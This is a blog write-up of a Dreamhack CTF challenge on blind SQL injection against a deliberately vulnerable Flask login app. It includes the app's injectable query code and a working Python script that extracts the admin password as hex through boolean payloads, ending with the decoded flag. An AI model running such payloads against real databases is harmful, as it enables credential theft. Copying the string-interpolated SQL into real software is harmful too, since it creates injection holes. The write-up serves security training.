---
title: blind sql injection advanced
author: thanguyen165
date: 2023-01-01 07:00:00 +0700
categories: [Practice, dreamhack]
tags: [Web Exploitation, dreamhack]
---

* Level: 2
* Link: [https://dreamhack.io/wargame/challenges/411](https://dreamhack.io/wargame/challenges/411)

## Description

> The administrator's password consists of "ASCII Code" and "Hangul".

### Attached

```sql
CREATE DATABASE user_db CHARACTER SET utf8;
GRANT ALL PRIVILEGES ON user_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `user_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO users (uid, upw) values ('admin', 'DH{**FLAG**}');
INSERT INTO users (uid, upw) values ('guest', 'guest');
INSERT INTO users (uid, upw) values ('test', 'test');
FLUSH PRIVILEGES;
```
{: file="init.sql" }


```py
import os
from flask import Flask, request, render_template_string
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'user_db')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''

@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
{: file="app.py" }

## Analyzation

In this challenge, the flag contains "Hangul", so we cannot use normal blind sqli to brute force each characters. Instead, we can convert flag to byte, and get the hexa form of the flag. Last, convert it back and we will have the flag.

## Solution

```py
import requests, string

def get(payload):
    URL = "http://host3.dreamhack.games:17983/?uid={}"
    response = requests.get(URL.format(payload))
    if response.status_code != 200:
        print("Failed to connect")
        exit()
    return response

# -------------------------------------------------

ALPHABET = string.digits + "abcdef"

flag = ""
for position in range(100):
    for c in ALPHABET:
        payload = f"admin' and substr(hex(upw), {position}, 1) ='{c}"
        response = get(payload)
        if 'exists' in response.text:
            flag += c
            print(flag)
            break
    # } in flag
    if "7d" in flag:
        break

# flag = "44487bec9db4eab283ec9db4ebb984ebb080ebb288ed98b8213f7d"
print(bytearray.fromhex(flag).decode())
```

The flag is
```
DH{이것이비밀번호!?}
```